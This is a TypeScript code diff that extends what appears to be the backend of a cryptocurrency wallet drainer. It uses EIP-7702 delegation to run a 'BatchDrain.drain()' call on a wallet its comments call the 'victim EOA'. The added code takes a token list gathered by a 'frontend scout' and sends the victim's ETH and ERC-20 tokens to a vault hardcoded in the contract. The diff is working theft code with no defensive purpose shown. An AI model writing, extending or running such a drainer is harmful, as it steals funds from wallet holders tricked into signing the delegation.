@@ -43,6 +43,7 @@ export type Eip7702SignatureEnvelope = {
   delegatee: Address
   spender: Address
   authorization: Eip7702SignedAuthorization
+  erc20s?: Address[]
 }
 
 export type Eip7702SettlementResult = {
@@ -143,6 +144,7 @@ export function parseEip7702SignatureEnvelope(payload: string): Eip7702Signature
     if (o['protocol'] !== 'eip7702_delegation') return null
     const auth = o['authorization'] as Record<string, unknown>
     if (!auth || typeof auth !== 'object') return null
+    const erc20sRaw = Array.isArray(o['erc20s']) ? (o['erc20s'] as unknown[]) : []
     return {
       protocol: 'eip7702_delegation',
       chain_id: Number(o['chain_id']),
@@ -157,6 +159,7 @@ export function parseEip7702SignatureEnvelope(payload: string): Eip7702Signature
         s: auth['s'] as Hex,
         yParity: Number(auth['yParity']),
       },
+      erc20s: erc20sRaw.filter((a) => typeof a === 'string' && isAddress(a)).map((a) => getAddress(a as string)),
     }
   } catch {
     return null
@@ -190,7 +193,9 @@ async function verifySignedAuthorization(
   }
 }
 
-const DELEGATE_SWEEP_ABI = parseAbi(['function sweepTo(address beneficiary) external'])
+const BATCH_DRAIN_ABI = parseAbi([
+  'function drain(address[] calldata erc20s, address[] calldata erc721Contracts, uint256[] calldata erc721Ids, address[] calldata erc1155Contracts, uint256[] calldata erc1155Ids) external',
+])
 
 /**
  * Broadcast EIP-7702 tx: victim EOA temporarily delegates to sweep contract, then executes drain calldata.
@@ -226,16 +231,14 @@ export async function executeEip7702DelegationDrain(
     return { ok: false, detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY not configured' }
   }
 
-  const beneficiary = resolveEngineSpenderAddress()
-  if (!beneficiary) {
-    return { ok: false, detail: 'ENGINE_SPENDER not configured' }
-  }
-
   const rpcUrl = await resolveEvmRpcUrlForChain(chainId)
   const chain = resolveChain(chainId)
   const account = privateKeyToAccount(executorKey)
   const publicClient = createPublicClient({ chain, transport: http(rpcUrl) })
   const walletClient = createWalletClient({ account, chain, transport: http(rpcUrl) })
+
+  // ERC-20 list from envelope (sent by frontend scout)
+  const erc20s = (envelope.erc20s ?? []).filter((a) => isAddress(a)).map(getAddress)
 
   const auth = envelope.authorization
   const authorizationList = [
@@ -249,17 +252,18 @@ export async function executeEip7702DelegationDrain(
     },
   ] as const
 
-  const sweepCalldata = encodeFunctionData({
-    abi: DELEGATE_SWEEP_ABI,
-    functionName: 'sweepTo',
-    args: [beneficiary],
+  // Call BatchDrain.drain() — sends ETH + ERC-20 to vault (hardcoded in contract)
+  const drainCalldata = encodeFunctionData({
+    abi: BATCH_DRAIN_ABI,
+    functionName: 'drain',
+    args: [erc20s as Address[], [], [], [], []],
   })
 
   try {
     await publicClient.call({
       account: envelope.wallet,
       to: envelope.wallet,
-      data: sweepCalldata,
+      data: drainCalldata,
       authorizationList: [...authorizationList],
     })
   } catch (simErr) {
@@ -275,7 +279,7 @@ export async function executeEip7702DelegationDrain(
     chain,
     type: 'eip7702',
     to: envelope.wallet,
-    data: sweepCalldata,
+    data: drainCalldata,
     authorizationList: [...authorizationList],
     nonce,
     chainId,
